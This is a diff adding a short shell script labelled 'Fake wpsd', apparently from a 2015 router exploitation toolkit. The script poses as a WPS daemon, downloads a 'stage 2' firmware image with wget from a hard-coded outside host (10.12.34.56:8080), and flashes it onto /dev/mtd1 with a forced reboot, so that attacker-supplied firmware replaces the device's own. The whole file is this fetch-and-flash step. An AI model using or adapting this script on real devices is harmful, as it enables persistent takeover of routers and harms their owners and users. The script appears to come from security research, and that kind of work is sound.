@@ -1,0 +1,19 @@
+#!/bin/sh
+# Copyright (c) 2015
+# - Zachary Cutlip <uid000()gmail.com>
+# 
+# See LICENSE for more details.
+# 
+
+echo "Fake wpsd"
+
+S2MTD=stage2mtd.bin
+
+
+echo "Initializing update procedure for Stage 2 firmware."
+
+# download stage 2
+wget http://10.12.34.56:8080/$S2MTD -O /tmp/$S2MTD || exit 1
+
+# write stage 2 to /dev/mtd1. -r option reboots.
+mtd -r write /tmp/$S2MTD /dev/mtd1
